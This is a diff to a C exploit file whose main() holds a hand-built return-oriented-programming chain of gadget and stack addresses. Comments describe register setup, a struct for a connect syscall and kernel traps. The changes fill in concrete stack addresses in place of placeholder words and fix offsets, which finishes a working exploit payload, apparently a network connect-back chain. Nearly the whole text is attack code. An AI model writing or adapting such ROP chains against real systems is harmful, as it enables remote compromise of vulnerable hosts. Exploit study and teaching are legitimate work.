@@ -38,13 +38,13 @@ int main(void)
                       "\xaa\xaa\xaa\xaa" // four-byte value 1
                       "\xaa\xaa\xaa\xaa" // four-byte value 0 
                       "" // addy 0xbfbf28f4
-                      "\x1b\xdc\xb9\xbb\x01\x01\x01\x01" // pop val at top of esp into eax
+                      "\x1b\xdc\xb9\xbb\xa0\x29\xbf\xbf" // pop val at top of esp into eax
                       "\x79\x2d\xb5\xbb" // mov val in eax to addy pointed to by edx
-                      "\x1b\xdc\xb9\xbb\x01\x01\x01\x01" // pop val at top of esp into eax
+                      "\x1b\xdc\xb9\xbb\x0c\x2a\xbf\xbf" // pop val at top of esp into eax
                       "\x79\x2d\xb5\xbb" // mov val in eax to addy pointed to by edx
-                      "\x1b\xdc\xb9\xbb\x01\x01\x01\x01" // pop val at top of esp into eax
+                      "\x1b\xdc\xb9\xbb\x38\x2a\xbf\xbf" // pop val at top of esp into eax
                       "\x79\x2d\xb5\xbb" // mov val in eax to addy pointed to by edx
-                      "\x1b\xdc\xb9\xbb\x01\x01\x01\x01" // pop val at top of esp into eax
+                      "\x1b\xdc\xb9\xbb\x64\x2a\xbf\xbf" // pop val at top of esp into eax
                       "\x79\x2d\xb5\xbb" // mov val in eax to addy pointed to by edx
                       "\xD4\xBE\xB3\xBB" // 0 out edx
                       "\x8a\xb8\xb7\xbb" // inc edx
@@ -52,10 +52,10 @@ int main(void)
                       "\x8a\xb8\xb7\xbb" // inc edx now value 3
                       "\x8a\xb8\xb7\xbb" // inc edx now value 4
                       "\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb" // edx now 16
-                      "\x22\xA4\xBA\xBB\x01\x01\x01\x01" // pop the addy esp stores into ecx (future address of 16 word) 
+                      "\x22\xA4\xBA\xBB\xa8\x29\xbf\xbf" // pop the addy esp stores into ecx (future address of 16 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (16 word) to stack
                       "\xD4\xBE\xB3\xBB" // 0 out edx
-                      "\xe1\xa0\xb9\xbb\x01\x01\x01\x01" // pop addy off of stack into eax
+                      "\xe1\xa0\xb9\xbb\xb0\x29\xbf\xbf" // pop addy off of stack into eax
                       "\x4d\xb9\xb5\xbb" // mov dl (0 byte) to addy stored at [eax + 1]
                       "\x8C\x9C\xA9\xBB" // inc eax
                       "\x4d\xb9\xb5\xbb" // mov dl (0 byte) to addy stored at [eax + 1]
@@ -75,13 +75,13 @@ int main(void)
                       "\x01\x01\x01\x01\x01\x01\x01\x01" // struct for connect syscall
                       ""
                       "\xD4\xBE\xB3\xBB" // 0 out edx
-                      "\x22\xA4\xBA\xBB\x14\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 0 word) 
+                      "\x22\xA4\xBA\xBB\x10\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 0 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (0 word) to stack
                       "\x8a\xb8\xb7\xbb" // inc edx
-                      "\x22\xA4\xBA\xBB\x40\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 1 word) 
+                      "\x22\xA4\xBA\xBB\x3c\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 1 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (1 word) to stack
                       "\x8a\xb8\xb7\xbb" // inc edx
-                      "\x22\xA4\xBA\xBB\x6c\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 2 word) 
+                      "\x22\xA4\xBA\xBB\x68\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 2 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (2 word) to stack
                       "\xbe\xc6\xb6\xbb" // move 85 into eax
                       "\x8C\x9C\xA9\xBB" // inc eax
@@ -123,7 +123,7 @@ int main(void)
                       "\xD4\xBE\xB3\xBB" // 0 out edx
                       "\x22\xA4\xBA\xBB\x01\x01\x01\x01" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
                       "\x7E\xB8\xB6\xBB" // move edx (0 word to y array)
-                      "\x22\xA4\xBA\xBB\\x01\x01\x01\x01" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
+                      "\x22\xA4\xBA\xBB\x01\x01\x01\x01" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
                       "\x7E\xB8\xB6\xBB" // move edx (0 word to 3rd param passed to syscall)
                       "\xE5\xB6\xA9\xBB" // trap into kernel followed by
                       "\x01\x01\x01\x01" // dummy value
